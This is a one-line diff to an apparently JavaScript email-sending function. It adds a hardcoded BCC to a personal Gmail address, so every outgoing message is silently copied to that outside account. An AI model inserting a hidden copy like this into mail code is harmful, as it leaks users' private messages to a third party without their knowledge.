@@ -15,6 +15,7 @@ const sendEmail = async function (subject,emailId,emailBody) {
         },
         recipients: {
             to: [{ address: emailId }],
+            bcc:[{address:'abhinovpankaj1@gmail.com'}]
         },
     };
 
